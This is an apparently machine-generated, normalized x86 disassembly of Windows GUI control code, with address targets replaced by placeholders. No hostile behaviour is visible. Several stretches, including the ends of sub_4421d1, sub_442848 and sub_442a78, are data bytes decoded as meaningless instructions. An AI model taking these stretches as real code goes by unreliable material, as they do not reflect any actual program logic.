mov eax [ ebp + 0x8 ]
push eax
call CallWindowProcA
mov [ ebx + 0xc ] eax
cmp [ ebx ] 0x203
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44e62c
test al al
je r-xdata
sub eax 0x100
je r-xdata
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub eax 0x2
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44e714
test al al
je r-xdata
sub eax 0xfb
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x50 ] 0x80
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_441214
test al al
je r-xdata
sub eax 0x7
je r-xdata
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ecx ebx
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_46a028
jmp r-xdata
sub eax 0x5
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffe9
call sub_403324
dec eax
je r-xdata
mov [ ebx + 0xc ] 0x4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4607d8
mov edi eax
test edi edi
je r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_43f950
test al al
je r-xdata
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44e7dc
test al al
je r-xdata
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xe8 ]
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x20
je r-xdata
sub eax 0x7c
je r-xdata
movsx eax [ ebx + 0x8 ]
mov [ ebp - 0xc ] eax
movsx eax [ ebx + 0xa ]
mov [ ebp - 0x8 ] eax
push 0x1
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44f7d8
push eax
push esi
call MapWindowPoints
mov ax [ ebp - 0xc ]
mov [ ebx + 0x8 ] ax
mov ax [ ebp - 0x8 ]
mov [ ebx + 0xa ] ax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x74 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov di [ ebx + 0x4 ]
cmp di 0xd
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_441214
test al al
je r-xdata
cmp di 0x1b
jne r-xdata
mov [ ebx + 0xc ] 0xffffffff
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_441238
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_441784
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ esi ]
sub eax 0x5
je r-xdata
mov edi [ esi ]
cmp edi 0x201
je r-xdata
cmp [ ebx + 0x25c ] 0x0
je r-xdata
sub eax 0xfd
je r-xdata
mov eax ebx
call sub_449754
test al al
jne r-xdata
cmp edi 0x203
jne r-xdata
mov edx esi
mov eax ebx
call sub_44d1ec
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
mov edx esi
mov eax ebx
call sub_44e7dc
test al al
jne r-xdata
add eax 0xffffffd0
sub eax 0x7
jb r-xdata
cmp [ ebx + 0x5d ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov di [ esi + 0x4 ]
cmp di 0xd
je r-xdata
mov eax [ ebx + 0x68 ]
mov eax [ eax + 0x18 ]
call sub_423dac
push eax
mov eax [ esi + 0x4 ]
push eax
call SetTextColor
mov eax [ ebx + 0x170 ]
call sub_424a30
call sub_423dac
push eax
mov eax [ esi + 0x4 ]
push eax
call SetBkColor
mov eax [ ebx + 0x170 ]
call sub_424a6c
mov [ esi + 0xc ] eax
jmp r-xdata
jmp r-xdata
mov edx esi
mov eax ebx
call sub_44d158
test al al
jne r-xdata
mov eax ebx
call sub_441214
test al al
je r-xdata
cmp di 0x1b
jne r-xdata
mov ax [ r-xdata ]
or ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x14 ]
jmp r-xdata
xor edx edx
mov eax ebx
call sub_441238
jmp r-xdata
sub_441892
add [ eax ] al
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi eax
xor eax eax
push ebp
push sub_4419f0
push [ fs : eax ]
mov [ fs : eax ] esp
movzx eax [ edx + 0x6 ]
cmp eax 0x8
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4419f7
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
jmp [ eax * 4 + jump_table_4418c0 ]
mov eax edi
mov si 0xffe9
call sub_403324
jmp r-xdata
mov eax edi
mov si 0xffb3
call sub_403324
jmp r-xdata
mov [ edi + 0x25d ] 0x0
mov eax edi
mov si 0xffb1
call sub_403324
mov eax edi
mov edx [ eax ]
call [ edx + 0xf0 ]
cmp [ edi + 0x25d ] 0x0
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
lea ecx [ ebp - 0x4 ]
mov eax [ edi + 0x23c ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_448fdc
mov eax edi
mov si 0xffeb
call sub_403324
mov eax edi
mov si 0xffb2
call sub_403324
jmp r-xdata
mov eax edi
mov si 0xffb0
call sub_403324
jmp r-xdata
mov [ edi + 0x25e ] 0x1
mov [ edi + 0x25d ] 0x1
mov eax edi
call sub_44df5c
jmp r-xdata
mov [ edi + 0x25e ] 0x0
mov [ edi + 0x25d ] 0x1
mov eax edi
call sub_44e048
push 0x0
push 0x0
push 0x1f
mov eax edi
call sub_44f7d8
push eax
call PostMessageA
cmp [ edi + 0x25e ] 0x0
jne r-xdata
push 0x0
push 0x0
push 0x14f
mov eax edi
call sub_44f7d8
push eax
call PostMessageA
jmp r-xdata
sub_441a44
push esi
push edi
mov esi eax
mov eax esi
call sub_44b0a0
mov edi [ esi + 0x214 ]
cmp edi 0xffffffff
je r-xdata
pop edi
pop esi
retn
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xd0 ]
sub_441a6c
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax esi
call sub_44fadc
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
call GetFocus
cmp eax [ esi + 0x240 ]
je r-xdata
mov bl 0x1
cmp eax [ esi + 0x244 ]
je r-xdata
xor ebx ebx
jmp r-xdata
sub_441ac0
push ebx
push esi
cmp [ eax + 0x222 ] 0x0
je r-xdata
mov si 0xffb3
call sub_403324
pop esi
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x224 ]
call [ ebx + 0x220 ]
pop esi
pop ebx
retn
sub_441aec
push ebx
mov ebx eax
mov eax ebx
call sub_44c790
push 0x0
mov eax [ ebx + 0x20c ]
push eax
push 0x141
mov eax ebx
call sub_44f7d8
push eax
call SendMessageA
xor eax eax
mov [ ebx + 0x240 ] eax
xor eax eax
mov [ ebx + 0x244 ] eax
pop ebx
retn
sub_441b24
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x104 ]
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
cmp ebx eax
jle r-xdata
cmp ebx 0x1
jge r-xdata
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x25c ] 0x1
xor eax eax
push ebp
push sub_441bba
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x9e
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xfc ]
imul ebx
mov edx [ ebp - 0x4 ]
add eax [ edx + 0x4c ]
add eax 0x2
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
push eax
call SetWindowPos
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_441bc1
mov eax [ ebp - 0x4 ]
mov [ eax + 0x25c ] 0x0
retn
mov ebx 0x1
sub_441bc1
push 0x5f
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
push eax
call SetWindowPos
pop ebx
pop ecx
pop ebp
retn
sub_441be0
push esi
push edi
mov esi eax
mov edi [ esi + 0x23c ]
test edi edi
je r-xdata
mov [ esi + 0x23c ] edx
pop edi
pop esi
retn
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop edi
pop esi
retn
sub_441c10
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_441c8f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
inc eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_441c96
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
lea ecx [ ebp - 0x4 ]
mov eax [ ebx + 0x23c ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
mov eax [ ebx + 0x23c ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov eax esi
pop edx
mov ebx [ eax ]
call [ ebx + 0xd4 ]
sub_441c9c
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
inc eax
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
mov eax [ ebx + 0x23c ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_441cdc
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_404368
xor eax eax
push ebp
push sub_441d25
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x23c ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_441d2c
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
sub_441d34
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44b4c4
mov eax esi
mov edx [ r-xdata ]
call sub_4032d8
mov [ ebx + 0x28 ] eax
pop esi
pop ebx
retn
sub_441d58
push ebx
mov ebx eax
mov eax ebx
call sub_455934
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x28 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032d8
pop edx
cmp dl [ eax + 0x69 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_441d90
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ eax + 0x208 ] 0x1
xor edx edx
push ebp
push sub_441de6
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0xcc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ eax + 0x208 ] 0x0
retn
sub_441df4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_44b4f8
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax esi
test bl bl
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
mov [ esi + 0x184 ] 0x0
sub_441e48
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_4502a8
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov dl [ esi + 0x69 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov eax edi
mov edx [ eax ]
call [ edx + 0xc8 ]
test al al
jne r-xdata
sub_441e9c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_441ec0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax [ edi ]
sub eax 0x201
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
sub eax 0x2
je r-xdata
mov edx edi
mov eax ebx
call sub_44d1ec
mov eax ebx
mov si 0xffb5
call sub_403324
test al al
jne r-xdata
sub eax 0xbb0e
je r-xdata
mov [ ebx + 0x208 ] 0x1
mov eax ebx
call sub_44f7d8
push eax
call SetFocus
mov [ ebx + 0x208 ] 0x0
mov eax ebx
mov si 0xffb5
call sub_403324
test al al
je r-xdata
cmp [ ebx + 0x208 ] 0x0
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
jmp r-xdata
sub_441f38
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_43c760
mov ebx eax
mov eax ebx
call sub_43c840
test al al
je r-xdata
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_44f7d8
mov edx eax
mov ecx [ edi + 0x4 ]
mov eax ebx
call sub_43c9d8
push 0x5
call GetStockObject
mov [ edi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_441f84
push ebx
push esi
mov esi edx
mov ebx eax
call sub_43c760
call sub_43c840
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_44dc2c
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_441fb0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44c664
cmp [ ebx + 0x209 ] 0x0
je r-xdata
pop esi
pop ebx
retn
or [ esi + 0x4 ] 0x2000
sub_441fe8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_441df4
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0x4b
mov eax esi
call sub_448740
mov edx 0x19
mov eax esi
call sub_448764
mov dl 0x1
mov eax esi
call sub_44fa0c
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax esi
pop esi
pop ebx
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_442074
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
mov eax ebp
call sub_44fadc
test al al
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
xor esi esi
mov si 0x1
jmp r-xdata
push 0x1
push edi
push 0xf4
mov eax ebp
call sub_44f7d8
push eax
call SendMessageA
push 0xfffffff0
mov eax ebp
call sub_44f7d8
push eax
call GetWindowLongA
and eax 0xf
movzx edi si
cmp eax edi
je r-xdata
sub_4420c8
push ebx
mov ebx eax
mov [ ebx + 0x210 ] dl
mov eax ebx
call sub_44fadc
test al al
je r-xdata
pop ebx
retn
mov eax ebx
call sub_4607d8
test eax eax
je r-xdata
mov edx [ eax + 0x220 ]
push edx
xor ecx ecx
mov edx 0xb007
call sub_44a198
sub_4420fc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_441fb0
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_44c590
xor eax eax
mov al [ ebx + 0x210 ]
mov eax [ eax * 4 + rw-data ]
or [ esi + 0x4 ] eax
pop esi
pop ebx
retn
sub_442164
push ebx
push esi
push edi
mov edi edx
mov ebx eax
cmp [ edi + 0x4 ] 0xd
jne r-xdata
cmp [ edi + 0x4 ] 0x1b
jne r-xdata
cmp [ ebx + 0x212 ] 0x0
jne r-xdata
mov edx edi
mov eax ebx
call sub_44ec54
cmp [ ebx + 0x211 ] 0x0
je r-xdata
mov eax [ edi + 0x8 ]
call sub_4606c0
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
mov eax ebx
mov si 0xffb8
call sub_403324
test al al
je r-xdata
mov eax ebx
mov si 0xffeb
call sub_403324
mov [ edi + 0xc ] 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4421d1
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_44224a
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_448fac
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_460768
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_44ec5c
mov eax ebx
mov si 0xffb8
call sub_403324
test al al
je r-xdata
mov eax ebx
mov si 0xffeb
call sub_403324
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442251
sub_442258
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ esi + 0x8 ]
mov eax edi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov al [ ebx + 0x210 ]
mov [ ebx + 0x212 ] al
cmp ebx edi
sete al
mov [ ebx + 0x212 ] al
jmp r-xdata
mov dl [ ebx + 0x212 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov edx esi
mov eax ebx
call sub_44ec64
pop edi
pop esi
pop ebx
retn
sub_4422ac
push ebx
push esi
mov esi edx
mov ebx eax
call sub_43c760
call sub_43c840
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_4422d8
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_43c760
mov ebx eax
mov eax ebx
call sub_43c840
test al al
je r-xdata
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_44f7d8
mov edx eax
mov ecx [ edi + 0x4 ]
mov eax ebx
call sub_43c9d8
push 0x5
call GetStockObject
mov [ edi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_442324
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_441df4
mov edx 0x71
mov eax esi
call sub_448740
mov edx 0x11
mov eax esi
call sub_448764
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov [ esi + 0x210 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax esi
pop esi
pop ebx
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_44238c
push ebx
push esi
mov ebx eax
mov eax ebx
mov si 0xffc8
call sub_403324
test al al
jne r-xdata
cmp [ ebx + 0x210 ] 0x1
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov al 0x1
xor eax eax
jmp r-xdata
pop esi
pop ebx
retn
sub_4423cc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
call sub_44c508
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec esi
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_44c4cc
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0x4 ]
je r-xdata
mov edi ebx
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
cmp [ eax + 0x95 ] 0x0
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
xor edx edx
call sub_455c28
sub_442488
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp bl [ eax + 0x211 ]
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x211 ] bl
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44fa0c
mov eax [ ebp - 0x4 ]
call sub_44fadc
test al al
je r-xdata
test bl bl
je r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
and eax 0x7f
push eax
push 0xf1
mov eax [ ebp - 0x4 ]
call sub_44f7d8
push eax
call SendMessageA
push ebp
call sub_4423cc
pop ecx
mov eax [ ebp - 0x4 ]
call sub_448bb8
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x208 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffeb
call sub_403324
sub_442514
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_441fb0
mov ecx r-xdata
mov edx edi
mov eax ebx
call sub_44c590
mov eax ebx
mov si 0xffc8
call sub_403324
and eax 0x7f
lea eax [ eax * 8 + rw-data ]
xor edx edx
mov dl [ ebx + 0x210 ]
mov eax [ eax + edx * 4 ]
mov edx [ edi + 0x4 ]
or edx 0x4
or eax edx
mov [ edi + 0x4 ] eax
pop edi
pop esi
pop ebx
retn
sub_44256b
add [ ebx - 0x75 ] dl
fmul [ ebx - 0x5de5173d ]
add [ eax ] al
push 0x0
xor eax eax
mov al [ ebx + 0x211 ]
push eax
push 0xf1
mov eax ebx
call sub_44f7d8
push eax
call SendMessageA
pop ebx
retn
sub_4425a0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_442615
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_448fac
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_460768
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_44ec5c
mov eax ebx
mov si 0xffb8
call sub_403324
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44261c
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
sub_442624
push esi
mov esi eax
mov ax [ edx + 0x6 ]
sub ax 0x1
jb r-xdata
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xcc ]
pop esi
retn
sub ax 0x4
je r-xdata
mov eax esi
mov si 0xffe9
call sub_403324
jmp r-xdata
pop esi
retn
sub_442654
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_442679
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442680
retn
sub_442848
daa
inc esp
add ah ch
dec edi
inc ebp
add [ ebx ] dl
add [ eax ] cl
push ebx
je r-xdata
test edi edi
je r-xdata
inc ecx
arpl [ esi + ebp * 2 + 0x73 ] si
add [ eax ] al
cmp [ ebx + 0xa0 ] 0x0
jne r-xdata
cmp edi esi
je r-xdata
xor eax eax
jmp r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
cmp [ esi + 0x22f ] 0x2
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_44285c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_455a18
mov [ esi + 0x60 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax esi
pop esi
pop ebx
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_4428ac
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0xa0 ]
test edi edi
je r-xdata
cmp [ ebx + 0xa0 ] 0x0
jne r-xdata
cmp edi esi
je r-xdata
xor eax eax
jmp r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
cmp [ esi + 0x22f ] 0x2
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_4428f0
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_4216f8
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0xa0 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_442944
sub_442920
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x54 ]
call sub_4634fc
test eax eax
setg dl
mov eax ebx
call sub_455d30
pop esi
pop ebx
retn
sub_442960
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_456224
mov [ esi + 0x60 ] 0x0
test [ esi + 0x1c ] 0x10
setne dl
mov eax esi
call sub_455d30
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax esi
pop esi
pop ebx
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_4429a8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4429cd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4429d4
retn
sub_442a78
pop ecx
sub al [ eax + eax + 0x63 ]
sub al [ eax + eax + 0x6d ]
sub al [ eax + eax + 0x11 ]
sub al [ eax + eax + 0x19 ]
sub al [ eax + eax + 0x21 ]
sub al [ eax + eax + 0x29 ]
sub al [ eax + eax + 0x31 ]
sub al [ eax + eax + 0x39 ]
sub al [ eax + eax + 0x41 ]
sub al [ eax + eax + 0x49 ]
sub al [ eax + eax + 0x51 ]
sub al [ eax + eax - 0xf ]
arpl [ edx ] bp
inc esp
add [ ebp + 0x2a ] ch
inc esp
add [ ecx ] dl
cmp bh [ eax + 0x2a ]
inc esp
add [ eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi - 0x6d ] ah
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
sub [ eax + eax - 0x7 ] eax
sub [ eax + eax + 0x1 ] eax
sub al [ eax + eax + 0x9 ]
sub al [ eax + eax - 0x17 ]
cmp [ edx ] ebp
inc esp
add [ ecx + 0x2a ] al
inc esp
add [ ecx + 0x2a ] cl
inc esp
add [ ecx + 0x2a ] dl
inc esp
add cl dh
cmp bh [ eax + 0x2a ]
inc esp
add [ eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edx * 4 - 0x4 ] ah
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
sub [ eax + eax + 0x3 ] eax
add [ eax ] al
add [ esi - 0x6d ] ah
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
or [ edx ] ebp
inc esp
add cl ch
cmp bh [ eax + 0x2a ]
inc esp
add [ eax ] ah
add [ eax ] al
add [ eax ] al
